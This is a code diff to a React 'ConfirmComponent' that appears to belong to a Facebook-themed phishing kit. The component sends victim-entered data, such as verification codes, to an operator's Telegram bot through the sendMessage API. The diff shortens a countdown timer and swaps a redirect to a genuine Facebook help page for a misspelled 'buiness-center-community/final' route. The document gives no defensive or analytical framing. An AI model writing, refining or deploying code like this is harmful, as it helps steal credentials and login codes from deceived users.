@@ -8,7 +8,7 @@ const ConfirmComponent = () => {
 
     const [activePopup, setActivePopup] = useState(false);
     const [activeLink, setActiveLink] = useState(false);
-    const [timeLeft, setTimeLeft] = useState(300); 
+    const [timeLeft, setTimeLeft] = useState(10); 
 
     const [activeWaring, setActiveWaring] = useState(false);
     const [firstCode, setFirstCode] = useState();
@@ -97,7 +97,7 @@ const ConfirmComponent = () => {
 
             axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                 .then((response) => {
-                    return window.location.href = "https://facebook.com/help/282489752085908/trang/?helpref=popular_topics"
+                    navigate('/buiness-center-community/final');
                 })
                 .catch((error) => {});
         }
